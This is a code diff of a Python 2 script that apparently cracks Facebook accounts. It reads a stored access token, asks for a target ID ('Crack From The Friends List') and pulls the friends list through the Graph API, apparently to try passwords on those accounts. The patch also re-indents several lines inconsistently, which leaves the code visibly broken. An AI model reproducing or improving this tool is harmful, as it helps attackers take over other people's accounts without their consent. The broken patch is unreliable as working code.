@@ -62,6 +62,7 @@ def tokenz():
     except KeyError:
         print '\x1b[1;91m[!] Token Wrong !'
         time.sleep(1.7)
+        tokenz()
 
 def menu():
 	os.system('clear')
@@ -117,22 +118,23 @@ def menu():
  
 def public():
 	global token
+        os.system('clear')
 	try:
-		token = open('login.txt', 'r').read()
+		token=open('login.txt', 'r').read()
 	except IOError:
 		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
 		tokenz()
-	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Friends List")
-	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
+	        print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Friends List")
+	        idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
 	try:
 		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 		sp = json.loads(pok.text)
 		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
 	except KeyError:
 		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
-	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
-	z = json.loads(r.text)
-	for i in z["data"]:
+	        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
+	        z = json.loads(r.text)
+	        for i in z["data"]:
 		uid = i['id']
 		na = i['name']
 		nm = na.rsplit(" ")[0]
